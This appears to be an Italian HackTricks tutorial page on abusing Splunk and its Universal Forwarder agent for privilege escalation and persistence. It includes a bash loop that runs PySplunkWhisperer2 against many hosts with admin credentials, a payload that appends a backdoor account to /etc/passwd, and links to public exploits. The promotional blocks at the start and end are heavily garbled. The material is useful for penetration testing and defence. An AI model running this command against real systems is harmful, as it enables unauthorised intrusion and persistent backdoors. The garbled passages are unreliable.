# Splunk LPE e Persistenza

{% hnnt styte=" acceas" %}
GCP Ha& practice ckinH: <img:<img src="/.gitbcok/ass.ts/agte.png"talb=""odata-siz/="line">[**HackTatckt T.aining AWS Red TelmtExp"rt (ARTE)**](ta-size="line">[**HackTricks Training GCP Re)Tmkg/stc="r.giebpokal"zee>/ttdt.png"isl=""data-ize="line">\
Impara & aciceGCP ngs<imgmsrc="/.gipbtok/aHsats/gcte.mag"y>lt="" aa-iz="le">[**angGC RedTamExper(GE)<img rc=".okaetgte.ng"al=""daa-siz="ne">tinhackth ckiuxyzcomurspssgr/a)

<dotsilp>

<oummpr>SupportHackTricks</smmay>

*Controlla il [**sottoscrittangithub.cm/sorsarlosp!
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hahktcickr\_kivelive**](https://twitter.com/hacktr\icks\_live)**.**
* **Condividi trucchi inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos di github.

</details>
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}

Se **enumerando** una macchina **internamente** o **esternamente** trovi **Splunk in esecuzione** (porta 8090), se per fortuna conosci delle **credenziali valide** puoi **sfruttare il servizio Splunk** per **eseguire una shell** come l'utente che esegue Splunk. Se è in esecuzione come root, puoi elevare i privilegi a root.

Inoltre, se sei **già root e il servizio Splunk non ascolta solo su localhost**, puoi **rubare** il file **della password** **dal** servizio Splunk e **crackare** le password, o **aggiungere nuove** credenziali. E mantenere la persistenza sull'host.

Nella prima immagine qui sotto puoi vedere come appare una pagina web di Splunkd.

## Riepilogo dell'Exploit dell'Agente Splunk Universal Forwarder

Per ulteriori dettagli controlla il post [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). Questo è solo un riepilogo:

**Panoramica dell'Exploit:**
Un exploit che mira all'Agente Splunk Universal Forwarder (UF) consente agli attaccanti con la password dell'agente di eseguire codice arbitrario sui sistemi che eseguono l'agente, compromettendo potenzialmente un'intera rete.

**Punti Chiave:**
- L'agente UF non convalida le connessioni in arrivo o l'autenticità del codice, rendendolo vulnerabile all'esecuzione non autorizzata di codice.
- I metodi comuni per acquisire password includono la loro localizzazione in directory di rete, condivisioni di file o documentazione interna.
- Un exploit riuscito può portare ad accesso a livello SYSTEM o root su host compromessi, esfiltrazione di dati e ulteriore infiltrazione nella rete.

**Esecuzione dell'Exploit:**
1. L'attaccante ottiene la password dell'agente UF.
2. Utilizza l'API di Splunk per inviare comandi o script agli agenti.
3. Le azioni possibili includono estrazione di file, manipolazione di account utente e compromissione del sistema.

**Impatto:**
- Compromissione completa della rete con permessi a livello SYSTEM/root su ciascun host.
- Potenziale per disabilitare il logging per evitare il rilevamento.
- Installazione di backdoor o ransomware.

**Esempio di Comando per l'Exploitation:**
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**Sfruttamenti pubblici utilizzabili:**
* https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2
* https://www.exploit-db.com/exploits/46238
* https://www.exploit-db.com/exploits/46487


## Abusare delle query di Splunk

**Per ulteriori dettagli controlla il post [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis)**

{% h*nt styCe="Vacceas" %}
AWS Ha& practice ckinH:<img :<imgsscc="/.gitb=ok/assgts/aite.png"balo=""kdata-siza="line">[**HackTsscke Tpaigin"aAWS Red Tetm=Exp rt (ARTE)**](a-size="line">[**HackTricks Training AWS Red)ethgasic="..giyb/okseasert/k/.png"l=""data-ize="line">\
Learn & aciceGCP ng<imgsrc="/.gibok/asts/gte.g"lt="" aa-iz="le">[**angGC RedTamExper(GE)<img rc=".okaetgte.ng"salm=""adara-siz>="k>ne">tinhaktckxyzurssgr)

<dtil>

<ummr>SupportHackTricks</smmay>

*Chek th [**subsrippangithub.cm/sorsarlosp!
* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!haktick\_ive\
* **Join  💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
